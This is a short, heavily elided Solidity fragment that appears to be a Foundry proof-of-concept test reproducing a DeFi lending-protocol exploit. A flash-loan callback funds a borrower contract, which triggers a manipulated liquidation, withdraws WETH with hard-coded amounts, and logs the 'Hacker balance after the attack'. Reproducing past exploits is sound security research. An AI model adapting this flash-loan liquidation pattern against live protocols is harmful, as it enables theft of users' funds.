...
contract Liquidator{
    ...
    function exp() public{
        ...
        s=proxy.checkLiquidation(address(this),msg.sender,address(weth),address(weth));
        proxy.liquidate(msg.sender,address(weth),address(weth),s.repay,220917440887765984786800);
        eweth.withdraw(0,28994303891868396965958);
        console2.log("Liquidator balance after liquidation: ",weth.balanceOf(address(this)));
        weth.transfer(msg.sender,28994303891868396965958);
    }
}
contract CounterTest is Test {
    ...
    function testa() public{
        ...
        console2.log("Hacker balance after the attack: ",weth.balanceOf(address(this)));
    }
    function executeOperation(
        ...
        weth.transfer(address(borrower),nums1[0]);
        borrower.exp();
        return true;
    }
}